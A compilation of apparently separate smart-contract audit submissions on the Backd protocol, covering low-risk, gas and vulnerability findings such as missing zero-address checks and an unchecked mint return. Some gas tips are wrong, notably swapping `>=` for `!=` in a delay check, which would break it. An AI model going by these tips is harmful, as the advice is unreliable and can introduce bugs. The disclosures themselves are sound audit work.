EVM design). Account existence must be checked prior to calling.  Consider checking for account-existence before the `call()` to make this safely extendable to user-controlled address contexts in future (or, at least, prevent the `address(0)` entry):  ```solidity File: GasBank.sol 67:     function withdrawFrom( 68:         address account, 69:         address payable to, 70:         uint256 amount 71:     ) public override { 72:         uint256 currentBalance = _balances[account]; 73:         require(currentBalance >= amount, Error.NOT_ENOUGH_FUNDS); 74:         require( 75:             msg.sender == account || addressProvider.isAction(msg.sender), 76:             Error.UNAUTHORIZED_ACCESS 77:         ); 78:  79:         if (msg.sender == account) { 80:             uint256 ethRequired = controller.getTotalEthRequiredForGas(account); 81:             require(currentBalance - amount >= ethRequired, Error.NOT_ENOUGH_FUNDS); 82:         } 83:         _withdrawFrom(account, to, amount, currentBalance); 84:     } 85:  86:     function _withdrawFrom( 87:         address account, 88:         address payable to, 89:         uint256 amount, 90:         uint256 currentBalance 91:     ) internal { 92:         _balances[account] = currentBalance.uncheckedSub(amount); 93:  94:         // solhint-disable-next-line avoid-low-level-calls 95:         (bool success, ) = to.call{value: amount}(""); //@audit can be address(0) 96:         require(success, Error.FAILED_TRANSFER); 97:  98:         emit Withdraw(account, to, amount); 99:     } ```  ## [L-07] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`  Use `abi.encode()` instead which will pad items to 32 bytes, which will prevent hash collisions (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` instead.  ```solidity protocol/contracts/tokenomics/InflationManager.sol:   627      function _getKeeperGaugeKey(address pool) internal pure returns (bytes32) {   628:         return keccak256(abi.encodePacked(_KEEPER_WEIGHT_KEY, pool));   629      }    631      function _getAmmGaugeKey(address token) internal pure returns (bytes32) {   632:         return keccak256(abi.encodePacked(_AMM_WEIGHT_KEY, token));   633      }    635      function _getLpStakerVaultKey(address vault) internal pure returns (bytes32) {   636:         return keccak256(abi.encodePacked(_LP_WEIGHT_KEY, vault));   637      } ```  ## [N-01] Unused named returns  While not consuming more gas with the Optimizer enabled: using both named returns and a return statement isn't necessary. Removing one of those can improve code clarity:  ```solidity tokenomics/FeeBurner.sol:47:        returns (uint256 received) tokenomics/FeeBurner.sol:98:        returns (uint256 received) ``` 
1. Title : Comment was not the same as actual code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L112-L129  In the function of removepool(). [`Comment`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L115) was used to said that :   ```      * @return `true` if successful.  ```  but in [`actual code`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L128) was :   ```         return removed; ```  So it can be changed as it should be.   ## Tool Used  Manual Review  ## Another Occurances   It happen too in this code :  1.) AddressProvider.sol [Lines247-261](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L247-L261) 2). LpGauge.sol [Lines.48-62](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L48-L62)   2. Title : Redundant Code `_prepare`  This code was redundant and it could be deleted for better code since it has  [1](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L50-L55) and [2](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L74-L79) with the same fn()  ```     /**      * @notice Same as `_prepare(bytes32,uint256,uint256)` but uses a default delay      */     function _prepare(bytes32 key, uint256 value) internal returns (bool) {         return _prepare(key, value, _MIN_DELAY);     } ```  ## Tool Used  Manual Review   3. Title : NatSpec is incomplete  1.) File : contracts/AddressProvider.sol ([Lines.77-87](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L77-L87))  Missing `@return`  ```     /**      * @notice Adds action.      * @param action Address of action to add.      */     function addAction(address action) external override onlyGovernance returns (bool) {         bool result = _actions.add(action);         if (result) {             emit ActionListed(action);         }         return result;     } ```  2.) File : contracts/BkdLocker.sol ([Lines.77-83](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L77-L83))  Missing `@return`  ```      /**      * @notice Lock gov. tokens.      * @dev The amount needs to be approved in advance.      */     function lock(uint256 amount) external override {         return lockFor(msg.sender, amount);     } ``` 3.) File : contracts/Controller.sol ([Lines.78-84](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L78-L84))  Missing `@param amount`  ```     /**      * @notice Prepares the minimum amount of staked BKD required by a keeper      */     function prepareKeeperRequiredStakedBKD(uint256 amount) external override onlyGovernance {         require(addressProvider.getBKDLocker() != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);         _prepare(_KEEPER_REQUIRED_STAKED_BKD, amount);     } ``` 4.) File : contracts/Controller.sol ([Lines.100-108](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L100-L108))  Missing `@param keeper`  ```     /**      * @notice Returns true if the given keeper has enough staked BKD to execute actions      */     function canKeeperExecuteAction(address keeper) external view override returns (bool) {         uint256 requiredBKD = getKeeperRequiredStakedBKD();         return             requiredBKD == 0 ||             IERC20(addressProvider.getBKDLocker()).balanceOf(keeper) >= requiredBKD;     } ``` 5.) File : contracts/Controller.sol ([Lines.118-130](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L118-L130))  Missing `@param payer`  ```      * @return the total amount of ETH require by `payer` to cover the fees for      * positions registered in all actions      */     function getTotalEthRequiredForGas(address payer) external view override returns (uint256) {         // solhint-disable-previous-line ordering         uint256 totalEthRequired;         address[] memory actions = addressProvider.allActions();         uint256 numActions = actions.length;         for (uint256 i; i < numActions; i = i.uncheckedInc()) {             totalEthRequired += IAction(actions[i]).getEthRequiredForGas(payer);         }         return totalEthRequired;     } ```  6.) File : contracts/utils/Preparable.sol ([Lines.50-55](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L50-L55))  ```     /**      * @notice Same as `_prepare(bytes32,uint256,uint256)` but uses a default delay      */     function _prepare(bytes32 key, uint256 value) internal returns (bool) {         return _prepare(key, value, _MIN_DELAY);     } ```  7.) File :  contracts/utils/Preparable.sol ([Lines.74-79](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L74-L79))    ```      /**      * @notice Same as `_prepare(bytes32,address,uint256)` but uses a default delay      */     function _prepare(bytes32 key, address value) internal returns (bool) {         return _prepare(key, value, _MIN_DELAY);     } ```  4. Title : Typo Comment   1.) File : contracts/BkdLocker.sol ([Line.174](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L174))  `invlude` change to `include`  ```      * @dev This does not invlude the gov. tokens queued for withdrawal. ```  2.) File : contracts/AddressProvider.sol ([Line.237](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L237))  `feeze` change into `freeze`  ```      * @param key Key to feeze ``` 5. Title : simplify the number of `_MAX_SUPPLY`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L12  ```   uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply ```  changed to :  ``` uint256 private constant _MAX_SUPPLY =  1e26 //100mil ```   
## Low ### IERC20.approve might revert for some token Some token return void in approve and will revert if the IERC20 interface is used. Consider using OZ's safeApprove https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L25-L26  ```solidity         IERC20(rewardToken_).approve(msg.sender, type(uint256).max);  ```  ### Hardcoded WETH address WETH address might change if deployed on L2 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L25-L26  ```solidity     address private constant _WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // WETH  ```
## `> 0` is less efficient than `!= 0` for uint in require condition Ref: https://twitter.com/GalloDaSballo/status/1485430908165443590 ``` protocol/contracts/tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, "No reward tokens in contract"); protocol/contracts/tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); protocol/contracts/tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); ```  ## Float multiplication optimization We can use the following function to save gas on float multiplications ``` // out = x * y unchecked{/} z function fmul(uint256 x, uint256 y, uint256 z) internal pure returns(uint256 out){ assembly{ if iszero(eq(div(mul(x,y),x),y)) {revert(0,0)} out := div(mul(x,y),z) } } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L156-L157  ```solidity         return Math.min((locked * elapsed) / totalTime, locked);  ```
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L227-L232   # Vulnerability details  ## Impact function `lockFor()`  in `BkdLocker` is supposed to lock 'msg.sender` funds and increase `user` address funds but if anyone one calls it with `0x0` address by mistake then his funds will be locked forever.  ## Proof of Concept This is `lockFor()` code in `BkdLocker`: ```     function lockFor(address user, uint256 amount) public override {         govToken.safeTransferFrom(msg.sender, address(this), amount);         _userCheckpoint(user, amount, balances[user] + amount);         totalLocked += amount;         emit Locked(user, amount);     } ``` As you can see there is no check that `user` is not `0x0`. code calls `_userCheckpoint()` which will increase `0x0` balances in the contract and there is no check in `_userCheckpoint()` either and user can lose all his funds just by one simple mistake.  ## Tools Used VIM  ## Recommended Mitigation Steps check that `user` is not `0x0` in `lcokFor`  
1. "!=" instead of ">"  ## POC https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmConvexGauge.sol#L158  ## Impact != 0 better than use > 0 to safe gas.  2. Chached array  ## POC https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L42  ## Impact chached array length "pool.length" to save gas.
1. Reentrancy issue in a function The functions below have an external call which can allow user to reenter into the function. Although reentering the function would cause harm to the caller than good.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L130-L134 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L108-L111  --------------------------------------- 2. Missing events and emit Certain events and emits are necessary for core changes and admin/critical activities to allow monitoring on third party tools. The following below are missing;  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L68 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L99  --------------------------------- 3.. Missing zero address check The following are missing checks for existence of zero address which may lead to transfers to zero address or causing some functions to no longer be accessible.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L124 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L56 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L103 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L70 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L31 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L31 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L111 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L139 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L359 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L126 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L144 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L65   --------------------------------------- 4.  Use of Deprecated safeApprove() function The OpenZeppelin ERC20 SafeApprove() function has been deprecated, replace safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L52 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L64 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L118 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L27   ----------------------------------------  5. Max approvals are risky Maximum approvals are widely considered as unsafe if the approved contract becomes compromised/malicious.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L64 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L118    --------------------------------- 6.. Costly external calls in a loop *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L127 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L44 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L44 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L70 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L99 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L102   --------------------------------------------  7. Use of unsafe approve() https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L25                 
# 1. ```AddressProvider.sol``` does not have a ```getSwapperRouter``` function  ## Line References  [FeeBurner.sol#L126](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L126)  [AddressProvider.sol]()  ## Impact  In ```FeeBurner.sol```, the ```_swapperRouter``` function gets the swapper router from the address provider. The ```AddressProvider.sol``` and ```IAddressProvider.sol``` contracts do not seem to have a ```getSwapperRouter``` function. If the ```_addressProvider``` in ```FeeBurner.sol``` is the ```AddressProvider.sol``` contract or implements ```IAddressProvider.sol``` then ```FeeBurner.sol``` would not function correctly or at all.  ## Proof of concept  The [_swapperRouter](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L54) function is called in the ```burnToTarget``` function which should then revert thus making ```burnToTarget``` uncallable.  ## Recommended Mitigation Steps  Add the ```getSwapperRouter``` function in the ```AddressProvider.sol``` and ```IAddressProvider.sol``` contracts.     # 2. Incompatibility with deflationary/rebase/fee-on-transfer tokens in ```FeeBurner.sol```  ## Line References  [FeeBurner.sol#L85](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L85)  ## Impact  In the ```burnToTarget``` function of ```FeeBurner.sol```, if the tokens being transferred are tokens whose balances change during a transfer such as deflationary and fee-on-transfer tokens, then the swap could fail since the swap input amount might be larger than the actual amount of tokens received in ```FeeBurner.sol```.  ## Recommended Mitigation Steps  When tokens are [transferred to the contract](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L70), check the balance of the contract before and after the transfer. Use the difference in the balances as the input amount for the swap call.     # 3. Return value for ```mint``` is not checked in ```InflationManager.sol```  ## Line References  [InflationManager.sol#L81](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L81)  [Minter.sol#L126-L135](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L126-L135)  ## Impact  In ```Minter.sol```, if inflation has not started and ```lastEvent == 0``` then the ```mint``` function will return false. In ```InflationManager.sol```, the ```mintRewards``` function does not check the return value for the mint call. When ```mintRewards``` is called by a gauge and fails, the transaction does not revert.  ## Proof of Concept  When calling ```claimRewards``` in ```AmmGauge.sol```, the call to ```mintRewards``` does not revert if minting has failed and the user loses their rewards.   ```     function claimRewards(address beneficiary) external virtual override returns (uint256) {         require(             msg.sender == beneficiary || _roleManager().hasRole(Roles.GAUGE_ZAP, msg.sender),             Error.UNAUTHORIZED_ACCESS         );         _userCheckpoint(beneficiary);         uint256 amount = perUserShare[beneficiary];         if (amount <= 0) return 0;         perUserShare[beneficiary] = 0;         controller.inflationManager().mintRewards(beneficiary, amount);         emit RewardClaimed(beneficiary, amount);         return amount;     } ```  The ```KeeperGauge.sol``` and ```LpGauge.sol``` contracts would fail in a similar way in addition to any other gauges that call ```mintRewards```.  ## Recommended Mitigation Steps  Consider either returning a bool value for the ```mintRewards``` function in ```InflationManager.sol``` and check the return value in the gauges or insert the mint call in a require,   ```require(Minter(minter).mint(beneficiary, amount))```
## [G-01] Unnecessary less than check `amount` is a UINT and therefore can not be less than 0. Change `<=` to `==`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L59
## [L-01] Inconsistency in event emissions Events are emitted at the beginning vs end of the function execution. Temporary variables are/aren't used in the event emission call.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L140-L154  ## [L-02] Code vs comment conflict: Backwards imp. of “safe” The "safe" function is not the safe version. The unsafe version is the one that reverts in unsuccessful.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L307-L327  ## [L-03] Use of deprecated SafeApprove() `SafeApprove()` has been deprecated according to OpenZeppelin.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L118  ## [L-04] Improper ownership transfer It is recommended to make ownership transfer a two-step process where you firstly set a pending owner address and then accept the pending owner in a second call.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L68-L72  ## [L-05] Missing event emissions on important setter functions https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86-L96  ## [L-06] Missing address(0) checks on important functions https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L227-L232 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L322 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L381 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L146 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L131  ## [N-01] Inconsistency in using modifier Sometimes modifier is used. Sometimes require statement is used.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L57 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L50  ## [N-02] Typo in "an" https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L66
  if just reading the constant it still costs gas .to make it less gas make it a smaller  bytes10 then bytes32 because  1 char =1 byte each byte less saves gas.    bytes32 internal constant _START_BOOST = "startBoost";    bytes32 internal constant _MAX_BOOST = "maxBoost";    bytes32 internal constant _INCREASE_PERIOD = "increasePeriod";    bytes32 internal constant _WITHDRAW_DELAY = "withdrawDelay"; https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L21-L24 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/Controller.sol#L25   https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L25-L28   Use Custom Errors instead of Revert Strings to save Gas Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) Source Custom Errors in Solidity: Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert("Insufficient funds.");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them. Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries). ROLEmanager.sol 28:        require(hasRole(Roles.GOVERNANCE, msg.sender), Error.UNAUTHORIZED_ACCESS); 46:        require(getRoleMemberCount(Roles.GOVERNANCE) > 1, Error.CANNOT_REVOKE_ROLE); 112:        require(role != Roles.GOVERNANCE, Error.CANNOT_REVOKE_ROLE); 113:        require(hasRole(role, account), Error.INVALID_ARGUMENT); https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L152  —----------------------------------------------  In a require statement it saves gas to make !=0 .Uint variable is anything greater or equal to zero it saves gas to make != 0   https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L91-L94 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L140   ++i costs less gas compared to i++ or i += 1 ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled. i++ increments i and returns the initial value of i. Which means: uint i = 1; i++; // == 1 but i == 2 But ++i returns the actual incremented value: uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2   epoch++  Change to  ++epoch  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L59  Same thing with minus  - -  Use  – i instead of putting multiple assignment to i  i = i - 1; https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L140  Uint48 after a bool and bool fills the slot of zeros so uint 48 is waste of gas and it will be cheaper to use uint and uint48 like a mix to make it one slot or after the address because address is 160 bits. If you want the bool then make uint48  into uint256 to save gas. https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L32 Order: Address -one slot  Bool -one slot Uint48-one slot  New Order: Address -160  Uint48-48 1 slot with 48 remaining  Bool -1slot  Saving:20_000 gas  —------------------------------------------ Make variable uninitialized to save gas for sstore 20_000 and memory 3 gas  Because by default its already zero  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L64 —------------------------------------ Reduce the size of error messages (Long revert Strings) Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met. Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.   1 byte for each  character   https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L152 In the EVM, there is no opcode for >= or <=. When using greater than or equal, two operations are performed: > and =. Using strict comparison operators hence saves gas require(delay >= _MIN_DELAY, Error.DELAY_TOO_SHORT);  Instead use  Delay != _MIN_DELAY  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L29 —------------------------------- Events with 3 fields make indexed to save gas https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/interfaces/vendor/ICvxLocker.sol#L51-L53  Dead code it wastes gas in the code  storing type  It will never call the approve function  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L63 
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L107-L111 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L129-L134   # Vulnerability details  ## Impact The view functions used for a user to check their claimable rewards vary in their implementation. This can cause users to believe they are due X amount but will receive Y.  ## Proof of Concept If the `inflationRecipient` is set, then `poolStakedIntegral` will be incremented in `claimableRewards()` but not in any other function like `allClaimableRewards()` or `poolCheckpoint()`.  If a user calls `claimableRewards()` after the `inflationRepient` has been set, `claimableRewards()` will return a larger value than `allClaimableRewards()` or the amount actually returned by `claimRewards()`.  ## Tools Used Manual review  ## Recommended Mitigation Steps To make the logic consistent, `claimableRewards()` needs `if (inflationRecipient == address(0))` added to it.  
No check on address zero can cause logic errors and lost of funds  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L221 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L221 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L52   Add more comments on burnFees function and natspec comments  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L35   Very hard to read code and  its very packed together.its so compacted that my vscode visual extension cant read if its state or memory variable  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L36-L48 —-------------------------------------- if (IERC20(token).allowance(address(this), spender) > 0) return;        IERC20(token).safeApprove(spender, type(uint256).max); Just space it out to make it more readable  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L63  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L52-L66  if allowance is more then zero then  it will return nothing and first return something to  help  a function that calls this function  if this allowance is more than zero it will return nothing and it you cant approve anything  its dead code 
